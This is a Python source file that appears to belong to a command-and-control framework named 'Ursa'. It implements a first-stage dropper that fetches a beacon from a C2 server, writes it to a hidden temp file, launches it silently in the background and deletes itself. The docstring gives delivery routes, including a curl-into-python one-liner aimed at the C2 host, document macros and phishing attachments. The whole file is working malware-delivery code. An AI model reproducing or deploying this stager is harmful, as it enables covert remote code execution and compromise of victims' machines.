#!/usr/bin/env python3
"""
Ursa — Stager (First-Stage Dropper)
======================================
Minimal script that downloads and executes the full beacon.
This is what gets delivered to the target — small footprint,
pulls the full implant from the C2 staging server.

Delivery methods:
    - python3 -c "$(curl -s http://C2:6708/stage)"
    - Embedded in a document macro
    - Dropped via file share
    - Phishing attachment

The stager:
    1. Downloads the beacon from /stage
    2. Writes it to a temp location
    3. Executes it as a background process
    4. Self-deletes
"""

import urllib.request
import tempfile
import subprocess
import sys
import os

C2 = "URSA_C2_URL"  # Replaced by payload generator


def stage():
    try:
        # Download beacon
        req = urllib.request.Request(
            f"{C2}/stage",
            headers={"User-Agent": "Mozilla/5.0"}
        )
        resp = urllib.request.urlopen(req, timeout=30)
        beacon_code = resp.read()

        # Write to temp
        tmp = tempfile.NamedTemporaryFile(suffix=".py", delete=False, prefix=".")
        tmp.write(beacon_code)
        tmp.close()

        # Execute in background
        python = sys.executable or "python3"
        subprocess.Popen(
            [python, tmp.name, "--server", C2],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )

        # Self-delete
        try:
            os.unlink(__file__)
        except Exception:
            pass

    except Exception:
        pass


if __name__ == "__main__":
    stage()
